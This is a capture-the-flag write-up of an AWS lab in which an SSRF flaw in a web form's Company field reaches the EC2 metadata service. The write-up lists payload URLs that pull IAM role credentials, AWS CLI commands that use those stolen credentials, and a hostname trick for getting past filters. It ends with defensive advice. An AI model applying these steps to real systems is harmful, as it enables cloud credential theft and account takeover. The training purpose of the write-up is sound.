# AWS EC2 SSRF - Metadata & IAM Credential Exposure

## Challenge Overview

### Objective

Exploit a Server-Side Request Forgery (SSRF) vulnerability in a web application hosted on an AWS EC2 instance to access the EC2 Instance Metadata Service (IMDS), retrieve IAM role credentials, authenticate to AWS using the compromised temporary credentials, and ultimately obtain the hidden flag.

The flag for this challenge is the **EC2 Instance ID**.

### Scenario

Secure Corp has deployed a web application on an AWS EC2 instance. A security audit identified a potential SSRF vulnerability in the application.

The application contains an input field that allows user-controlled data to be used by the server when making requests. By manipulating this input, an attacker can force the application to send requests to internal services that should not be directly accessible.

The EC2 instance also has an IAM role attached to it, causing temporary AWS credentials to be exposed through the EC2 Instance Metadata Service.

The objective is to exploit this SSRF vulnerability, access EC2 metadata, retrieve the IAM role credentials, authenticate to AWS, and obtain the EC2 Instance ID as the flag.

### Skills Practiced

* Web application reconnaissance
* Server-Side Request Forgery (SSRF)
* AWS EC2 Instance Metadata Service (IMDS)
* IAM role enumeration
* AWS temporary credential extraction
* AWS CLI authentication
* Cloud environment enumeration
* Understanding SSRF impact in cloud environments

---

# Environment

## Cloud Provider

AWS

## Initial Access

The participant is provided with the URL/IP address of a web application hosted on an AWS EC2 instance.

Example:

```
http://<TARGET-IP>/index.html
```

No AWS credentials are provided initially.

The intended attack path is to obtain temporary IAM credentials through the vulnerable web application.

## Available Tools

* Web browser
* Burp Suite
* AWS CLI
* Command-line tools such as curl

---

# Attack Methodology

## Initial Hypothesis

The challenge description indicates that the application is vulnerable to SSRF and that the EC2 instance exposes IAM credentials through instance metadata.

The primary hypothesis is therefore:

1. Identify a user-controlled input that causes the server to make outbound requests.
2. Verify that the input is vulnerable to SSRF.
3. Redirect the server-side request to the EC2 Instance Metadata Service.
4. Enumerate EC2 metadata.
5. Identify the IAM role attached to the instance.
6. Retrieve temporary IAM credentials.
7. Authenticate to AWS using the compromised credentials.
8. Enumerate the environment and obtain the Instance ID flag.

Expected targets:

* EC2 Instance Metadata Service
* `/latest/meta-data/`
* IAM role metadata
* IAM security credentials
* EC2 Instance ID

---

# Attack Workflow

The attack was performed by first identifying the vulnerable application input and then using SSRF to access internal AWS services.

## Step 1 - Initial Access Validation

### Action

Visit the provided web application.

```
http://<TARGET-IP>/index.html
```

### Result

The web application loads successfully.

The homepage does not immediately expose an obvious SSRF input.

### Observation

Additional application pages and functionality need to be investigated.

---

## Step 2 - Identify the SSRF Input

### Goal

Identify an application parameter that causes the server to make a request based on user-controlled input.

During application enumeration, a form containing multiple input fields was identified.

The **Company** field was found to be vulnerable to SSRF.

### Action

Provide a URL/IP address pointing to an internal service.

```
http://127.0.0.1/
```

### Result

The application returned content from the internal service.

### Observation

The response confirms that the server is performing the request rather than the request being made directly by the client.

This establishes a Server-Side Request Forgery vulnerability.

---

## Step 3 - Access EC2 Instance Metadata

### Goal

Use the SSRF vulnerability to access the EC2 Instance Metadata Service.

The AWS EC2 metadata service is accessible through:

```
http://169.254.169.254/
```

The metadata API can be enumerated through:

```
http://169.254.169.254/latest/meta-data/
```

### Action

Submit the metadata endpoint through the vulnerable Company field.

```
http://169.254.169.254/latest/meta-data/
```

### Result

The application returns EC2 instance metadata.

### Observation

The SSRF vulnerability allows access to an internal AWS service that should not be directly accessible from the public web application.

This significantly increases the impact of the SSRF vulnerability.

---

## Step 4 - Enumerate IAM Role Information

### Goal

Determine whether an IAM role is attached to the EC2 instance.

The IAM-related metadata is located under:

```
http://169.254.169.254/latest/meta-data/iam/
```

Further enumeration leads to:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Result

The metadata service returns the IAM role associated with the EC2 instance.

Example:

```
ec2-prod-role
```

### Observation

The EC2 instance has an IAM role attached to it, meaning temporary AWS credentials may be available through the metadata service.

---

## Step 5 - Retrieve IAM Security Credentials

### Goal

Retrieve the temporary credentials associated with the EC2 IAM role.

### Action

Request the credentials endpoint:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
```

### Result

The metadata service returns temporary AWS credentials containing values such as:

```
{
  "AccessKeyId": "<AWS_ACCESS_KEY_ID>",
  "SecretAccessKey": "<AWS_SECRET_ACCESS_KEY>",
  "Token": "<AWS_SESSION_TOKEN>",
  "Expiration": "<EXPIRATION_TIME>"
}
```

### Observation

The SSRF vulnerability has escalated from internal service access to exposure of temporary AWS credentials.

These credentials can potentially be used to interact with AWS APIs according to the permissions granted to the EC2 IAM role.

---

## Step 6 - Authenticate with AWS CLI

### Goal

Verify that the retrieved temporary credentials are valid and identify the AWS principal they belong to.

### Linux

```
export AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
export AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
export AWS_SESSION_TOKEN=<AWS_SESSION_TOKEN>
```

### Windows

```
SET AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
SET AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
SET AWS_SESSION_TOKEN=<AWS_SESSION_TOKEN>
```

### Command

```
aws sts get-caller-identity
```

### Result

AWS returns information about the authenticated principal.

Example:

```
{
    "UserId": "...",
    "Account": "...",
    "Arn": "arn:aws:iam::<ACCOUNT-ID>:role/ec2-prod-role"
}
```

### Observation

The temporary credentials obtained through the SSRF vulnerability can successfully authenticate to AWS.

The attacker is now operating with the permissions assigned to the compromised EC2 IAM role.

---

## Step 7 - Capture the Flag

### Goal

Obtain the EC2 Instance ID.

The Instance ID is available through the EC2 metadata service.

```
http://169.254.169.254/latest/meta-data/instance-id
```

During investigation, an alternative AWS metadata hostname was also discovered:

```
http://instance-data/latest/meta-data/instance-id
```

The response contains the EC2 Instance ID.

Example:

```
i-0123456789abcdef0
```

### Result

The EC2 Instance ID is obtained.

This value represents the hidden flag for the challenge.

---

# Attack Chain

```
Initial Web Application Access
             |
             v
     Identify Company Field
             |
             v
       SSRF Vulnerability
             |
             v
  EC2 Instance Metadata Service
             |
             v
      /latest/meta-data/
             |
             v
       IAM Role Enumeration
             |
             v
    IAM Security Credentials
             |
             v
      Temporary AWS Keys
             |
             v
     AWS CLI Authentication
             |
             v
      AWS Environment Access
             |
             v
        EC2 Instance ID
             |
             v
             FLAG
```

---

# Findings

## Security Weakness

The web application contains a Server-Side Request Forgery vulnerability that allows an attacker to control the destination of server-side HTTP requests.

The application does not sufficiently restrict requests to internal or link-local addresses.

As a result, an attacker can use the application as a proxy to access the AWS EC2 Instance Metadata Service.

## Impact

The vulnerability can expose sensitive EC2 metadata and, when an IAM role is attached to the instance, temporary AWS credentials.

An attacker who obtains these credentials may interact with AWS APIs using the permissions assigned to the compromised IAM role.

The potential impact therefore extends beyond the web application to the AWS infrastructure associated with the EC2 instance.

---

# Evidence

Important SSRF test:

```
http://127.0.0.1/
```

EC2 metadata:

```
http://169.254.169.254/latest/meta-data/
```

IAM role enumeration:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

IAM credentials:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
```

AWS identity validation:

```
aws sts get-caller-identity
```

Instance ID:

```
http://169.254.169.254/latest/meta-data/instance-id
```

Alternative metadata hostname discovered during investigation:

```
http://instance-data/latest/meta-data/instance-id
```

---

# Defensive Recommendations

* Implement a strict allowlist for outbound URLs.
* Do not allow user-controlled input to directly determine server-side request destinations.
* Block requests to link-local addresses such as `169.254.169.254`.
* Block access to private IP ranges where they are not required.
* Validate and normalize URLs before making server-side requests.
* Restrict HTTP redirects to prevent SSRF filter bypasses.
* Use network-level egress controls in addition to application-level validation.
* Require IMDSv2 for EC2 instances.
* Apply least-privilege IAM policies to EC2 instance roles.
* Avoid granting unnecessary permissions to application instances.
* Monitor unusual access to the EC2 Instance Metadata Service.
* Monitor and rotate exposed temporary credentials when compromise is suspected.
* Enable AWS CloudTrail and appropriate security monitoring.

---

# Key Takeaways

* SSRF can become significantly more severe when the vulnerable application runs inside a cloud environment.
* AWS EC2 exposes instance metadata through the Instance Metadata Service.
* The EC2 metadata service may contain information about the instance and its attached IAM role.
* IAM roles can provide temporary credentials to applications running on EC2.
* Exposure of those credentials can allow an attacker to interact with AWS APIs according to the role's permissions.
* A successful SSRF should therefore be evaluated for access to cloud metadata services, not only internal web applications.
* Alternative representations or hostnames such as `instance-data` can sometimes be useful when a direct metadata IP is filtered.
* Always keep the investigation aligned with the challenge objective and avoid unnecessary enumeration once the required attack path is identified.

---

# References

* AWS EC2 Instance Metadata Service
* AWS IAM Roles for EC2
* AWS Security Token Service (STS)
* AWS CLI Documentation
* OWASP Server-Side Request Forgery (SSRF) Prevention Cheat Sheet
